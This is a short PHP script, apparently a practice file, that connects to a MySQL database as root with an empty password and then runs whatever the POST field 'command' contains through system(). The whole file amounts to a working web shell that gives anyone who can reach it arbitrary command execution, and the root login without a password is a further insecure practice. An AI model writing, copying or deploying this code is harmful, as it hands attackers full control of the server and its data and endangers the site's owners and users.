<?php
$pdo = new PDO('mysql:host=localhost;dbname=practice_5', 'root', '');

$command = $_POST['command'];

system($command);
?>